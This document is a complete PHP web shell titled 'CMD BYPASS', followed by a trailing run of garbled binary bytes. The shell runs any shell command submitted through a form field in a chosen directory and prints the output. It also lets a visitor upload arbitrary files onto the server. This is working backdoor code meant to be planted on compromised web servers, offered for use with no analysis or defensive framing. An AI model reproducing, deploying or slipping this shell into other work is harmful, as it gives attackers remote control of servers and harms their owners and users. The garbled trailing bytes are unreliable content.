<style>@import url('https://fonts.googleapis.com/css2?family=Ubuntu&display=swap');body,input {font-family: 'Ubuntu', sans-serif;}table {width:50%;background: #fff;padding:15px;border-radius:10px;box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);}table td {padding:5px;}div.label {padding-top:5px;padding-bottom:5px;}div.input input[type=text] {width:100%;padding:8px;border-radius:8px;border: 1px solid #ebebeb;background: #ebebeb;outline: none;}div.submit {padding-top:10px;padding-bottom: 10px;}div.submit input[type=submit] {width:100%;padding:8px;border-radius:8px;background: #e7f3ff;outline: none;border: 1px solid #000000;color: #1889f5;font-weight: bold;}div.submit input[type=submit]:hover {cursor: pointer;}div.textarea textarea {width:100%;height:230px;resize: none;border-radius:8px;outline: none;border: 1px solid #ebebeb;background: #ebebeb;padding:20px;}</style><?php if($_POST['dir']==""){$curdir=`pwd`;}else{$curdir=$_POST['dir'];}if($_POST['king']==""){$curcmd="ls -lah";}else{$curcmd=$_POST['king'];}?><table align="center"><tr><th colspan="2"><h2>.:: CMD BYPASS ::.</h2></th></tr><form method="post" enctype="multipart/form-data"><tr><td colspan="2"><div class="label"><span>Execute command</span></div><div class="input"><input name="king" type="text" value="<?php echo $curcmd;?>"></div></td></tr><tr><td colspan="2"><div class="label"><span>Change directory</span></div><div class="input"><input name="dir" type="text" value="<?php echo $curdir;?>"></div></td></tr><tr><td colspan="2"><div class="submit"><input name="exe" type="submit" value="Execute"></div></td></tr><tr><td colspan="2"></td></tr><tr><td colspan="2"></td></tr><tr><td colspan="2"></td></tr><tr><td colspan="2"></td></tr><tr><td><input name="fila" type="file" size="90"></td><td><input name="upl" type="submit" value="Upload"></td></tr></form><?php if(($_POST['upl'])=="Upload" ){if(move_uploaded_file($_FILES['fila']['tmp_name'],$curdir."/".$_FILES['fila']['name'])) {echo "The file has been uploaded<br><br>";} else {echo "There was an error uploading the file, please try again!";}}?><tr><td colspan="2"><div class="textarea"><textarea placeholder="result command"><?php if(($_POST['exe'])=="Execute"){$curcmd="cd ".$curdir.";".$curcmd;$f=popen($curcmd,"r");while(!feof($f)){$buffer=fgets($f,4096);$string.=$buffer;}pclose($f);echo htmlspecialchars($string);}?></textarea></div></td></tr></table>


	ï¿½qï¿½hï¿½Zu1ï¿½ï¿½>Æ­ï¿½ï¿½Tï¿½Zï¿½Pnï¿½ï¿½wï¿½ï¿½ß»ï¿½f~Jï¿½ï¿½\iï¿½ï¿½^Kï¿½3ï¿½Vï¿½5f.ï¿½Ç¹ï¿½ï¿½VÖ›mï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½^L]ï¿½ï¿½6rï¿½@ï¿½ï¿½
